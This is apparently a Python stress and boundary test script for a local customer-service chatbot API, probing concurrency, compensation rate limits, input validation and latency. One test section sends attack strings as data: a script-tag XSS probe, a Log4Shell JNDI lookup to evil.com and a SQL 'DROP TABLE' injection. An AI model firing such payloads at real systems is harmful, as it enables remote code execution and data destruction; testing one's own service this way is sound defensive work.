"""Backend stress + boundary tests against http://127.0.0.1:8002"""
import json
import time
import threading
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

API = 'http://127.0.0.1:8003'
DATA = Path(r'C:\Users\admin\.easyclaw\workspace\customer-service-team\data')


def post(path, data, timeout=20):
    req = urllib.request.Request(
        f'{API}{path}',
        data=json.dumps(data, ensure_ascii=False).encode('utf-8'),
        headers={'Content-Type': 'application/json'},
    )
    try:
        return urllib.request.urlopen(req, timeout=timeout).read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return f'HTTP{e.code}:' + e.read().decode('utf-8', 'replace')[:200]
    except Exception as e:
        return f'EXC:{type(e).__name__}:{e}'


def get(path):
    try:
        return urllib.request.urlopen(f'{API}{path}', timeout=10).read().decode('utf-8', 'replace')
    except Exception as e:
        return f'EXC:{e}'


print('=' * 70)
print('STRESS TEST')
print('=' * 70)

# 1. concurrent writes
print('\n[1] 50 concurrent /api/chat (different sessions)')
state_path = DATA / 'state.json'
before = json.loads(state_path.read_text('utf-8'))
before_total = before.get('stats', {}).get('total_conversations', 0)
print(f'   before total_conversations: {before_total}')

t0 = time.time()
def shoot(i):
    return post('/api/chat', {'session_id': f'concurrent-{i}', 'message': f'how to refund {i}'})
with ThreadPoolExecutor(max_workers=20) as pool:
    results = list(pool.map(shoot, range(50)))
elapsed = time.time() - t0
ok = sum(1 for r in results if r.startswith('{'))
print(f'   elapsed {elapsed:.1f}s | ok {ok}/50 | qps {ok/elapsed:.1f}')

after = json.loads(state_path.read_text('utf-8'))
after_total = after.get('stats', {}).get('total_conversations', 0)
diff = after_total - before_total
print(f'   after total_conversations: {after_total} | delta: {diff}')
print('   [OK] no data loss' if diff == ok else f'   [WARN] possible loss: expected {ok} delta {diff}')

# 2. compensation race
print('\n[2] 20 concurrent compensation requests, same session')
def comp_shoot(i):
    return post('/api/chat', {'session_id': 'race-comp', 'message': f'compensate me 30 yuan #{i}'})
with ThreadPoolExecutor(max_workers=20) as pool:
    list(pool.map(comp_shoot, range(20)))

tickets = json.loads(get('/api/tickets'))
race_tickets = [t for t in tickets if t.get('session_id') == 'race-comp']
auto = [t for t in race_tickets if t.get('decision', {}).get('action') == 'AUTO_APPROVE']
print(f'   tickets created: {len(race_tickets)} | AUTO_APPROVE: {len(auto)}')
print('   [OK] rate-limit holds across threads' if len(auto) <= 1 else f'   [BUG] rate-limit bypassed: {len(auto)} auto-approvals')

# 3. TF-IDF corner cases
print('\n[3] TF-IDF corner queries')
queries = [
    'I want a refund',
    '   refund   ',
    'refund refund refund refund',
    'tuituituituikuan',
    '\u9000\u9000\u9000\u9000\u9000\u6b3e',
    '\u9000\u6b3e\u9000\u6b3e\u9000\u6b3e',
]
for q in queries:
    raw = post('/api/chat', {'session_id': 'tfidf-test', 'message': q})
    if not raw.startswith('{'):
        print(f'   {q!r} -> ERR: {raw[:80]}'); continue
    r = json.loads(raw)
    top = r['kb_results'][0] if r['kb_results'] else None
    if top:
        cat = top['category']; question = top['question'][:18]
    else:
        cat = '-'; question = ''
    conf = r['confidence']
    print(f'   {q!r} -> conf={conf:.2f} top={cat}/{question}')

# 4. greetings -> gap?
print('\n[4] greetings should NOT pollute gaps.json')
greetings = ['hi', 'hello', 'thanks', 'ok', '\u4f60\u597d', '\u5728\u5417']
gaps_path = DATA / 'gaps.json'
gb = len(json.loads(gaps_path.read_text('utf-8'))) if gaps_path.exists() else 0
for g in greetings:
    raw = post('/api/chat', {'session_id': 'greeting', 'message': g})
    if raw.startswith('{'):
        r = json.loads(raw)
        print(f'   {g!r:8s} -> conf={r["confidence"]:.2f}')
ga = len(json.loads(gaps_path.read_text('utf-8'))) if gaps_path.exists() else 0
print(f'   gaps delta: {ga - gb}')
if ga - gb >= len(greetings):
    print('   [WARN] every greeting becomes a gap, will pollute the queue')

# 5. emotion trend
print('\n[5] same session, 5 angry messages')
for i in range(5):
    raw = post('/api/chat', {'session_id': 'rage', 'message': 'you are scammers, garbage system!'})
    if raw.startswith('{'):
        r = json.loads(raw)
        print(f'   #{i+1}: score={r["emotion"]["score"]} risk={r["emotion"]["risk"]} esc={r["escalated"]}')

# 6. compensation amounts
print('\n[6] extreme compensation amounts')
big_msgs = [
    'compensate me 999999 yuan',
    'compensate me 100000000 yuan',
    'compensate me 1000000 yuan',
    'compensate me -500 yuan',
    'compensate me 0.01 yuan',
    'pay me 100 dollars',
]
for m in big_msgs:
    raw = post('/api/chat', {'session_id': f'big-{abs(hash(m))%9999}', 'message': m})
    if not raw.startswith('{'):
        print(f'   {m!r} -> {raw[:80]}'); continue
    r = json.loads(raw)
    if r.get('ticket_id'):
        tk = json.loads(get('/api/tickets'))
        t = next((t for t in tk if t['id'] == r['ticket_id']), None)
        amt = t.get('decision', {}).get('amount') if t else None
        action = t.get('decision', {}).get('action') if t else None
        print(f'   {m!r} -> amt={amt} action={action}')
    else:
        print(f'   {m!r} -> not escalated')

# 7. /api/kb/add huge
print('\n[7] /api/kb/add with huge fields')
huge_q = 'X' * 10000
huge_a = 'Y' * 50000
r = post('/api/kb/add', {
    'category': 'test',
    'question': huge_q,
    'answer': huge_a,
    'keywords': ['test'],
})
print(f'   60KB submit -> {r[:120]}')

# 8. satisfaction boundary
print('\n[8] /api/satisfaction boundary')
for s in [0, 6, -1, 100, 'abc', None, 3.5]:
    r = post('/api/satisfaction', {'session_id': 'rate-test', 'score': s})
    print(f'   score={s!r} -> {r[:90]}')

# 9. tickets pagination
print('\n[9] /api/tickets size')
tk = get('/api/tickets')
data = json.loads(tk)
print(f'   total: {len(data)} tickets | response size: {len(tk)} bytes')
if len(data) > 100:
    print('   [WARN] >100 tickets, no pagination')

# 10. health perf
print('\n[10] /api/health x50 latency')
ts = []
for _ in range(50):
    t0 = time.time(); get('/api/health'); ts.append((time.time() - t0) * 1000)
ts.sort()
print(f'   p50={ts[25]:.1f}ms p95={ts[47]:.1f}ms p99={ts[49]:.1f}ms')

# 11. rebuild index while chatting
print('\n[11] rebuild index concurrent with chats')
def trigger_rebuild():
    return post('/api/vector/build', {})
def trigger_chats():
    times = []
    for _ in range(10):
        t0 = time.time()
        post('/api/chat', {'session_id': 'rebuild-race', 'message': 'refund'})
        times.append((time.time() - t0) * 1000)
    return times

t = threading.Thread(target=trigger_rebuild)
t.start()
chat_times = trigger_chats()
t.join()
chat_times.sort()
print(f'   chat latency during rebuild: p50={chat_times[5]:.0f}ms p99={chat_times[-1]:.0f}ms')

# 12. weird inputs
print('\n[12] weird/malicious inputs')
weird = [
    '<script>alert(1)</script>',
    '<<<>>>>',
    '\u00bf\u00bf\u00bf' * 100,
    '\u4f60\u597d' * 1000,  # near max_length
    '\x00\x01\x02',
    '${jndi:ldap://evil.com/x}',
    '\\n\\r\\t',
    '"; DROP TABLE users; --',
]
for w in weird:
    r = post('/api/chat', {'session_id': 'weird', 'message': w})
    print(f'   {w[:30]!r:35s} -> {r[:100]}')

# 13. observer/report endpoints
print('\n[13] observer / report endpoints status')
endpoints = ['/api/health', '/api/stats', '/api/kb/stats', '/api/vector/stats', '/api/tickets']
for e in endpoints:
    r = get(e)
    bad = 'EXC' in r[:5]
    print(f'   {e} -> {"FAIL" if bad else "OK"} ({len(r)} bytes)')

print('\n' + '=' * 70)
print('DONE')
print('=' * 70)
